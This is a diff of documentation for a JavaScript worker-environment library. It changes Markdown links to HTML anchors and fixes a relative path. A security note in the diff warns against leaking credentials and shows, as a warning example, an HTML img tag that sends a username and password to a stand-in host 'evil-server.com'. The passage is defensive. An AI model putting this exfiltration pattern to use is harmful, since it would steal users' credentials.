@@ -27,7 +27,7 @@ All worker servers will use this function to issue requests; it's up to the in-d
 
 ### Link.parseUri
 
-`Link.parseUri` wraps [Stephen Levithan's parseUri](http://stevenlevithan.com/demo/parseuri/js/), a function which breaks a URL into its component pieces. Some common uses for this:
+`Link.parseUri` wraps <a target="_top" href="http://stevenlevithan.com/demo/parseuri/js/">Stephen Levithan's parseUri</a>, a function which breaks a URL into its component pieces. Some common uses for this:
 
 ```javascript
 var urld = Link.parseUri(request);
@@ -60,7 +60,7 @@ if (origin instanceof WorkerServer) {
 
 You never want to let credentials leak back into user applications, as they may be able to pass that data out to a remote host.
 
- > Even a totally isolated worker can reach a remote server! For instance, what happens when they put `<img src="http://evil-server.com/picture.png?user=pfraze&password=foobar" />` in their HTML? Unless you have highly-restrictive [Content Security Policies](https://developer.mozilla.org/en-US/docs/Security/CSP), the data in the query parameters will escape.
+ > Even a totally isolated worker can reach a remote server! For instance, what happens when they put `<img src="http://evil-server.com/picture.png?user=pfraze&password=foobar" />` in their HTML? Unless you have highly-restrictive <a target="_top" href="https://developer.mozilla.org/en-US/docs/Security/CSP">Content Security Policies</a>, the data in the query parameters will escape.
 
 For this reason, it is best to add Auth headers to requests in the environment. For instance:
 
@@ -96,4 +96,4 @@ Environment.request = function(origin, request) {
 ## Further Topics
 
  - [Using LinkJS, the HTTP wrapper](../lib/linkjs.md)
- - [Using the Environment API](lib/environment.md)
+ - [Using the Environment API](../lib/environment.md)
